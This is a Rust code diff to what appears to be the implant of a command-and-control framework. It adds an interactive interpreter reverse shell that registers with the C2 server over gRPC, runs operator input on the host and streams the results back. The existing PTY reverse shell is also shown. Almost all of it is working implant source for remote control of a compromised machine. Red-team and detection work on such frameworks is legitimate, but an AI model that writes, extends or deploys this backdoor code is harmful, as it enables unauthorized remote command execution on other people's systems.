@@ -1,9 +1,18 @@
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::io::{Read, Write};
 use std::path::Path;
 use transport::Transport;
+
+use crossterm::{
+    cursor,
+    style::{Color, SetForegroundColor},
+    terminal, QueueableCommand,
+};
+use eldritch_core::Value;
+use eldritch_repl::{Input, Repl, ReplAction};
+use eldritchv2::Interpreter;
 
 pub async fn run_reverse_shell_pty<T: Transport>(
     task_id: i64,
@@ -175,22 +184,267 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     let status = child.wait().ok();
     if let Some(s) = status {
         let _ = internal_exit_tx.send(Some(s)).await;
-        // Also signal the parent if needed, although exit_tx in original code was purely internal.
-        // We received exit_tx as argument but it wasn't used in original logic except to pass to the async block?
-        // Ah, in original code: `let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);`
-        // `exit_tx` was captured by the main task (this one), `exit_rx` by the output task.
-        // So we used `internal_exit_tx` here.
-        // What about the `exit_tx` argument I added?
-        // If the caller wants to know when it exits?
-        // The caller (ImixAgent) just spawns and forgets (stores handle).
-        // So I can ignore the argument or remove it.
-        // I'll keep the signature simple.
     }
-
-    // Original code: `let _ = exit_tx.send(Some(s)).await;` -> This was sending to the output task.
-    // So `internal_exit_tx` handles that.
 
     #[cfg(debug_assertions)]
     log::info!("stopping reverse_shell_pty (task_id={})", task_id);
+    Ok(())
+}
+
+pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T) -> Result<()> {
+    // Channels to manage gRPC stream
+    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
+    let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);
+
+    #[cfg(debug_assertions)]
+    log::info!("starting repl_reverse_shell (task_id={})", task_id);
+
+    // Initial Registration
+    if let Err(_err) = output_tx
+        .send(ReverseShellRequest {
+            task_id,
+            kind: ReverseShellMessageKind::Ping.into(),
+            data: Vec::new(),
+        })
+        .await
+    {
+        #[cfg(debug_assertions)]
+        log::error!("failed to send initial registration message: {}", _err);
+    }
+
+    // Initiate gRPC stream
+    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
+        return Err(e.into());
+    }
+
+    // Move logic to blocking thread
+    run_repl_loop(task_id, input_rx, output_tx).await;
+    Ok(())
+}
+
+async fn run_repl_loop(
+    task_id: i64,
+    mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
+    output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
+) {
+    let _ = tokio::task::spawn_blocking(move || {
+        let mut interpreter = Interpreter::new().with_default_libs();
+        let mut repl = Repl::new();
+        let mut stdout = VtWriter {
+            tx: output_tx,
+            task_id,
+        };
+
+        let _ = render(&mut stdout, &repl);
+
+        // State machine for VT100 parsing
+        let mut parser = InputParser::new();
+
+        while let Some(msg) = input_rx.blocking_recv() {
+            if msg.kind == ReverseShellMessageKind::Ping as i32 {
+                continue;
+            }
+            if msg.data.is_empty() {
+                continue;
+            }
+
+            // Parse input
+            let inputs = parser.parse(&msg.data);
+            for input in inputs {
+                match repl.handle_input(input) {
+                    ReplAction::Quit => return,
+                    ReplAction::Submit { code, .. } => {
+                        // Move to next line
+                        let _ = stdout.queue(cursor::MoveToNextLine(1));
+                        let _ = stdout.flush();
+
+                        // Execute
+                        match interpreter.interpret(&code) {
+                            Ok(v) => {
+                                if !matches!(v, Value::None) {
+                                    let s = format!("{:?}\r\n", v);
+                                    let _ = stdout.write(s.as_bytes());
+                                }
+                            }
+                            Err(e) => {
+                                let s = format!("Error: {}\r\n", e);
+                                let _ = stdout.write(s.as_bytes());
+                            }
+                        }
+                        let _ = render(&mut stdout, &repl);
+                    }
+                    ReplAction::AcceptLine { .. } => {
+                        let _ = stdout.queue(cursor::MoveToNextLine(1));
+                        let _ = render(&mut stdout, &repl);
+                    }
+                    ReplAction::Render => {
+                        let _ = render(&mut stdout, &repl);
+                    }
+                    ReplAction::ClearScreen => {
+                        let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
+                        let _ = stdout.queue(cursor::MoveTo(0, 0));
+                        let _ = render(&mut stdout, &repl);
+                    }
+                    ReplAction::Complete => {
+                        let state = repl.get_render_state();
+                        let (start, completions) = interpreter.complete(&state.buffer, state.cursor);
+                        repl.set_suggestions(completions, start);
+                        let _ = render(&mut stdout, &repl);
+                    }
+                    ReplAction::None => {}
+                }
+            }
+        }
+    })
+    .await;
+}
+
+struct VtWriter {
+    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
+    task_id: i64,
+}
+
+impl std::io::Write for VtWriter {
+    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
+        let data = buf.to_vec();
+        match self.tx.blocking_send(ReverseShellRequest {
+            kind: ReverseShellMessageKind::Data.into(),
+            data,
+            task_id: self.task_id,
+        }) {
+            Ok(_) => Ok(buf.len()),
+            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
+        }
+    }
+
+    fn flush(&mut self) -> std::io::Result<()> {
+        match self.tx.blocking_send(ReverseShellRequest {
+            kind: ReverseShellMessageKind::Ping.into(),
+            data: Vec::new(),
+            task_id: self.task_id,
+        }) {
+            Ok(_) => Ok(()),
+            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
+        }
+    }
+}
+
+struct InputParser {
+    buffer: Vec<u8>,
+}
+
+impl InputParser {
+    fn new() -> Self {
+        Self { buffer: Vec::new() }
+    }
+
+    fn parse(&mut self, data: &[u8]) -> Vec<Input> {
+        self.buffer.extend_from_slice(data);
+        let mut inputs = Vec::new();
+        let mut i = 0;
+        while i < self.buffer.len() {
+            let b = self.buffer[i];
+            if b == 0x1b {
+                // Escape sequence
+                if i + 2 < self.buffer.len() {
+                    if self.buffer[i + 1] == b'[' {
+                        match self.buffer[i + 2] {
+                            b'A' => { inputs.push(Input::Up); i += 3; continue; }
+                            b'B' => { inputs.push(Input::Down); i += 3; continue; }
+                            b'C' => { inputs.push(Input::Right); i += 3; continue; }
+                            b'D' => { inputs.push(Input::Left); i += 3; continue; }
+                            _ => {
+                                // Unknown, consume escape
+                                i += 1;
+                                continue;
+                            }
+                        }
+                    }
+                } else {
+                    // Incomplete? Wait for more data?
+                    break;
+                }
+            } else if b == b'\r' || b == b'\n' {
+                 inputs.push(Input::Enter);
+                 i += 1;
+            } else if b == 0x7f || b == 0x08 {
+                 inputs.push(Input::Backspace);
+                 i += 1;
+            } else if b == 0x03 {
+                 inputs.push(Input::Cancel);
+                 i += 1;
+            } else if b == 0x04 {
+                 inputs.push(Input::EOF);
+                 i += 1;
+            } else if b == 0x0c {
+                 inputs.push(Input::ClearScreen);
+                 i += 1;
+            } else if b == 0x09 {
+                 inputs.push(Input::Tab);
+                 i += 1;
+            } else {
+                 inputs.push(Input::Char(b as char));
+                 i += 1;
+            }
+        }
+        // Drain processed
+        self.buffer = self.buffer.split_off(i);
+        inputs
+    }
+}
+
+fn render<W: std::io::Write>(stdout: &mut W, repl: &Repl) -> std::io::Result<()> {
+    let state = repl.get_render_state();
+
+    // Clear everything below the current line to clear old suggestions
+    stdout.queue(terminal::Clear(terminal::ClearType::FromCursorDown))?;
+
+    stdout.queue(terminal::Clear(terminal::ClearType::CurrentLine))?;
+    stdout.queue(cursor::MoveToColumn(0))?;
+
+    // Write prompt (Blue)
+    stdout.queue(SetForegroundColor(Color::Blue))?;
+    stdout.write_all(state.prompt.as_bytes())?;
+    stdout.queue(SetForegroundColor(Color::Reset))?;
+
+    // Write buffer
+    stdout.write_all(state.buffer.as_bytes())?;
+
+    // Render suggestions if any
+    if let Some(suggestions) = &state.suggestions {
+        // Save cursor position
+        stdout.queue(cursor::SavePosition)?;
+        stdout.queue(cursor::MoveToNextLine(1))?;
+        stdout.queue(cursor::MoveToColumn(0))?;
+
+        if !suggestions.is_empty() {
+             for (i, s) in suggestions.iter().take(10).enumerate() {
+                 if i > 0 {
+                    stdout.write_all(b"  ")?;
+                 }
+                 if Some(i) == state.suggestion_idx {
+                    // Highlight selected (Black on White)
+                     stdout.queue(crossterm::style::SetBackgroundColor(Color::White))?;
+                     stdout.queue(SetForegroundColor(Color::Black))?;
+                     stdout.write_all(s.as_bytes())?;
+                     stdout.queue(crossterm::style::SetBackgroundColor(Color::Reset))?;
+                     stdout.queue(SetForegroundColor(Color::Reset))?;
+                 } else {
+                     stdout.write_all(s.as_bytes())?;
+                 }
+             }
+             if suggestions.len() > 10 {
+                 stdout.write_all(b" ...")?;
+             }
+        }
+
+        // Restore cursor
+        stdout.queue(cursor::RestorePosition)?;
+    }
+
+    let cursor_col = state.prompt.len() as u16 + state.cursor as u16;
+    stdout.queue(cursor::MoveToColumn(cursor_col))?;
+
+    stdout.flush()?;
     Ok(())
 }
